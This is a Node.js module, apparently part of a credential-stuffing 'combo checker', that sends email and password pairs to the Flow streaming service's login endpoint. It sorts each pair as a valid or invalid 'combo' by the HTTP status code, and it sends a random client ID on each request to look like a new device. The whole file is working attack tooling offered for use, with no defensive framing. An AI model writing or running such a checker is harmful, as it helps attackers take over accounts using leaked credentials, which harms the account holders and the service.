const request = require('request')

module.exports.login = (email, password, language) => {
    return new Promise((res, rej) => {
        request.post('https://web.flow.com.ar/auth/v2/login', {
            json: {
                "accountId": email,
                "password": password,
                "deviceName": "Win32",
                "deviceType": "cloud_client",
                "devicePlatform": "WindowsPC",
                "clientCasId": this.randomStr()
            }
        }, (error, response, body) => {
            if (error) return rej(`${language.translations.requestError} ${error.code}`)

            if(response.statusCode == 401)  {
                rej(`${language.translations.invalidCombo} S#${response.statusCode}`)
            } else {
                res(`${language.translations.validCombo} S#${response.statusCode}`)
            }
        })
    })
}

module.exports.randomStr = () => {
    let chars = 'abcdefghijklmnopqwrstuvwxyz1234567890'
    let data = '';

    for(let i = 0; i < 22; i++) {
        data += chars.split('')[Math.floor(Math.random() * chars.length)]
    }

    return data;
}